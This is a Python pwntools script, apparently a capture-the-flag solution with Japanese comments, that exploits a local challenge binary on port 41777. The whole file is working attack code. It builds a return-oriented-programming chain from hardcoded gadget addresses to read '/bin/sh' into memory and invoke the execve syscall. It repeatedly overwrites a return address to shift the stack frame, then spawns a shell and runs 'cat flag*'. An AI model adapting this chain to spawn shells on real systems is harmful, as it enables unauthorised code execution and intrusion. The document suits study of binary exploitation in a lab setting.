from pwn import *

io = remote('localhost', 41777)

DATA_ADDR = 0x4c5000

# read(stdin, DATA_ADDR, 7)
payload = p64(0x40217f)    # pop rdi; ret
payload += p64(0)          # stdin
payload += p64(0x40a1ee)   # pop rsi; ret;
payload += p64(DATA_ADDR)  # data addr
payload += p64(0x44afa2)   # pop rdx; ret
payload += p64(0x7)        # /bin/sh length
payload += p64(0x44fde0)   # read addr

# execve("/bin/sh", NULL, NULL)
payload += p64(0x40217f)   # pop rdi; ret
payload += p64(DATA_ADDR)  # data addr
payload += p64(0x40a1ee)   # pop rsi; ret;
payload += p64(0)          # NULL
payload += p64(0x44afa2)   # pop rdx; ret
payload += p64(0)          # NULL
payload += p64(0x450847)   # pop rax; ret
payload += p64(0x3b)       # 0x3b
payload += p64(0x41b326)   # syscall

# main.bufにROP設定
io.sendlineafter(b'>', payload)

# profileを繰り返し呼んでrbpを調整
io.sendlineafter(b'>', b'3')
for i in range(0x402):
    print(f"Progress: {hex(i)}/0x402")
    io.sendlineafter(b'Job >', b'1' * (0x10 - 4) + p64(0x401889))

# main.buf[0]にreturn
io.sendlineafter(b'Job >', b'1' * (0x10 - 4) + p64(0x40101a))  # ret

# readに応答
sleep(0.1)
io.sendline(b'/bin/sh')

# フラグを表示
sleep(0.1)
io.sendline(b'cat flag*')

io.interactive()